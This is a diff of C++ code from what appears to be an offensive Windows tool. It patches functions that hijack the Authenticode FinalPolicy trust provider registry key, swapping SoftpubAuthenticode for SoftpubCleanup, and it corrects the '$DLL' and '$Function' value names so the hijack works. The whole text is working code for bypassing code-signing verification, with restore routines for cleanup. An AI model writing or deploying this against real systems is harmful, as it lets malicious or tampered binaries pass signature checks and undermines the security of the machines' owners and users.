@@ -48,6 +48,22 @@ bool SetRegistryValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR fu
     return true;
 }
 
+// Trust Provider keys use $DLL and $Function (not Dll/FuncName)
+bool SetTrustProviderValues(HKEY rootKey, LPCWSTR subkey, LPCWSTR dllPath, LPCWSTR funcName, REGSAM accessFlag) {
+    HKEY hKey;
+    LONG result = RegCreateKeyExW(rootKey, subkey, 0, nullptr, 0, KEY_SET_VALUE | accessFlag, nullptr, &hKey, nullptr);
+    if (result != ERROR_SUCCESS) {
+        std::wcerr << L"[-] Failed to open key: " << subkey << L" (Error " << result << L")" << std::endl;
+        return false;
+    }
+    result = RegSetValueExW(hKey, L"$DLL", 0, REG_SZ, reinterpret_cast<const BYTE*>(dllPath), (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
+    if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return false; }
+    result = RegSetValueExW(hKey, L"$Function", 0, REG_SZ, reinterpret_cast<const BYTE*>(funcName), (DWORD)((wcslen(funcName) + 1) * sizeof(wchar_t)));
+    if (result != ERROR_SUCCESS) { RegCloseKey(hKey); return false; }
+    RegCloseKey(hKey);
+    return true;
+}
+
 std::wstring normalize_provider_guid(const std::wstring& guid) {
     std::wstring normalized = guid;
     if (normalized.empty()) return normalized;
@@ -59,19 +75,19 @@ std::wstring normalize_provider_guid(const std::wstring& guid) {
 bool hijack_finalpolicy() {
     if (g_verbose) std::cout << "[*] Hijacking FinalPolicy (SoftpubCleanup)..." << std::endl;
     LPCWSTR subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
-    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
+    return SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
 }
 
 bool cleanup_finalpolicy() {
     if (g_verbose) std::cout << "[*] Restoring FinalPolicy (SoftpubAuthenticode)..." << std::endl;
     LPCWSTR subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
-    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubAuthenticode", KEY_WOW64_64KEY);
+    return SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey, L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubAuthenticode", KEY_WOW64_64KEY);
 }
 
 bool hijack_custom_provider(const std::wstring& guid) {
     if (g_verbose) std::cout << "[*] Registering custom trust provider..." << std::endl;
     std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\" + normalize_provider_guid(guid);
-    return SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
+    return SetTrustProviderValues(HKEY_LOCAL_MACHINE, subkey.c_str(), L"C:\\Windows\\System32\\WINTRUST.DLL", L"SoftpubCleanup", KEY_WOW64_64KEY);
 }
 
 bool cleanup_custom_provider(const std::wstring& guid) {
